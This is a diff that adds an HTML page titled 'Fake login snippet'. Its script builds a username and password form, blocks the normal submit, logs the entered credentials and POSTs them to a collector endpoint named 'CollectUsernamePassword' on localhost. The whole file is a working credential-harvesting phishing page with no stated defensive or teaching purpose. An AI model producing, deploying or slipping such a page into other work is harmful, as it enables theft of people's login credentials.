@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+
+<html class="no-js" lang="">
+  
+<head>
+    
+<meta charset="utf-8">
+    
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+    
+<title>Fake login snippet</title>
+  
+</head>
+  
+<body>
+  
+<script type="text/javascript">
+  
+
+  
+var form = document.createElement("FORM");
+  
+form.setAttribute("method", "POST");
+  
+form.setAttribute("accept-charset", "utf-8");
+  
+form.setAttribute("action", "");
+  
+form.setAttribute("id", "myform");
+  
+
+  
+var username22 = document.createElement("input");
+  
+username22.setAttribute("id", "username");
+  
+username22.setAttribute("name", "username");
+  
+username22.setAttribute("type", "text");
+ 
+ 
+  
+var password22 = document.createElement("input");
+  
+password22.setAttribute("id", "password");
+  
+password22.setAttribute("name", "password");
+  
+password22.setAttribute("type", "password");
+
+  
+  
+var submit = document.createElement("input");
+  
+submit.setAttribute("name", "submit");
+  
+submit.setAttribute("value", "Log in");
+  
+submit.setAttribute("type", "submit");
+
+  
+  
+form.appendChild(username22);
+  
+form.appendChild(document.createElement("br"));
+  
+form.appendChild(password22);
+  
+form.appendChild(document.createElement("br"));
+  
+form.appendChild(document.createElement("br"));
+  
+form.appendChild(submit);
+  
+  
+document.getElementsByTagName('body')[0].appendChild(form);
+
+  
+
+
+form.addEventListener("submit", function (e) {
+e.preventDefault();
+e.stopPropagation();
+
+if(e.target && e.target.id == 'myform') {
+var xmlhttp = new XMLHttpRequest();
+var username1 = document.getElementById("username").value;
+var password1 = document.getElementById("password").value;
+
+console.log(username1, password1);
+
+var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://localhost:49670/API/CollectUsernamePassword');
+                xhr.setRequestHeader('Content-Type', 'application/x-www-for-urlencoded');
+                xhr.send('username = ' + username1 + '&password = ' + password1);
+
+}
+
+
+}
+)
+
+</script>
+  
+</body>
+
+</html>
